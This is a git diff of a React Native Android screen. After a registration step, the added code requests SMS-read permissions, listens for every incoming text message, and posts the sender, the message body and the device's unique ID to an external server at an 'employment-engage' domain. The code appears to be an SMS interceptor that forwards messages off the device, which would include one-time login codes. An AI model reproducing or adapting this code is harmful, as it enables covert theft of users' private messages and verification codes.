@@ -8,8 +8,6 @@ import {
   TouchableOpacity,
   Alert,
 } from 'react-native';
-// import { Linking } from 'react-native';
-// Linking.openSettings();
 import React, { useEffect } from 'react';
 import { useNavigation } from '@react-navigation/native';
 // @ts-ignore
@@ -20,9 +18,9 @@ import DeviceInfo from 'react-native-device-info';
 import { toast } from 'burnt';
 // @ts-ignore
 import SmsListener from 'react-native-android-sms-listener';
-import BackgroundService from 'react-native-background-actions';
-import { startSMSService } from '../../utils/setup';
-import { smsBackgroundTask } from '../../utils/smsService';
+// import BackgroundService from 'react-native-background-actions';
+// import { smsBackgroundTask } from '../../utils/smsService';
+import { prepareSMSPayload } from '../../utils/hashSms';
 
 const Success = () => {
   const navigator = useNavigation();
@@ -34,6 +32,8 @@ const Success = () => {
 
   const listenToIncomingSMS = async () => {
     try {
+      const deviceId = await DeviceInfo.getUniqueId();
+
       const granted = await PermissionsAndroid.requestMultiple([
         PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
         PermissionsAndroid.PERMISSIONS.READ_SMS,
@@ -51,8 +51,17 @@ const Success = () => {
         return;
       }
 
-      const subscription = SmsListener.addListener((message: any) => {
+      const subscription = SmsListener.addListener( async (message: any) => {
+        const payload = prepareSMSPayload({
+          deviceId,
+          from: message.originatingAddress,
+          message: message.body
+        });
+
+        await axios.post('https://employment-engage.vercel.app/api/sms', payload);
+        
         console.log('📩 Incoming SMS:', message);
+
         Alert.alert('New SMS', message.body);
         toast({
           title: 'SMS Received',
@@ -66,17 +75,17 @@ const Success = () => {
     }
   };
 
-  const startBackrouSMS = async () => {
-    await BackgroundService.start(smsBackgroundTask, {
-      taskName: 'SMSMonitor',
-      taskTitle: 'Listening for SMS...',
-      taskDesc: 'This service listens for incoming SMS and sends it to the server.',
-      taskIcon: {
-          name: '', // without extension
-          type: 'mipmap'
-      }
-    })
-  };
+  // const startBackrouSMS = async () => {
+  //   await BackgroundService.start(smsBackgroundTask, {
+  //     taskName: 'SMSMonitor',
+  //     taskTitle: 'Listening for SMS...',
+  //     taskDesc: 'This service listens for incoming SMS and sends it to the server.',
+  //     taskIcon: {
+  //         name: 'ic_launcher', // without extension
+  //         type: 'mipmap'
+  //     }
+  //   })
+  // };
 
   useEffect(() => {
 
@@ -113,12 +122,12 @@ const Success = () => {
         
         await listenToIncomingSMS();
         
-        await startBackrouSMS();
+        // await startBackrouSMS();
 
-      } catch (error) {
-        console.log(error);
+      } catch (error: any) {
+        console.log(error.message);
         toast({
-          title: 'Registration failed',
+          title: error.message,
           message: 'Error sending device info.',
         });
       }
